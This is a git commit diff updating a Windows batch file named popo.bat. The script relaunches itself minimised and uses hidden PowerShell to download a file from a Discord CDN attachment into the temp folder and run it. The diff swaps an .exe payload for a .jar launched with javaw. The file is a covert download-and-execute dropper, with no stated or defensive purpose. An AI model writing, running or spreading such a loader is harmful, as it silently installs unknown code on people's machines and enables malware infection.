57ade13b0e131810e5521b63e22e65f0b2d2c013
FadeGames <71284716+FadeGames@users.noreply.github.com>
2026-01-11 18:20:46 -0500

    Update popo.bat

--- popo.bat
+++ popo.bat
@@ -2,4 +2,4 @@
 if "%1"=="h" goto :hidden
 start /min cmd /c "%~f0" h & exit /b
 :hidden
-powershell.exe -NoProfile -WindowStyle Hidden -Command "$url='https://cdn.discordapp.com/attachments/1344411176443842676/1459868169459204321/PwS9viEbig.exe?ex=6964d7ae&is=6963862e&hm=8cde39cd0deb3fe5b13da6cd9d9e4c3cc5652e0ff7d20fda325c0e899fe1d52f&';$out=Join-Path $env:TEMP 'popo.exe';Invoke-WebRequest -Uri $url -OutFile $out;Start-Process $out"
+powershell.exe -NoProfile -WindowStyle Hidden -Command "$url='https://cdn.discordapp.com/attachments/1344411176443842676/1459879596584472658/EasyForMe-Runtime-1342753538459045909.jar?ex=6964e253&is=696390d3&hm=4095c2a59f053d639620454039058204e69b23f9a333da32c9949fcf76d7025a&'; $out=Join-Path $env:TEMP 'EasyForMe.jar'; Invoke-WebRequest -Uri $url -OutFile $out; javaw.exe -jar $out"
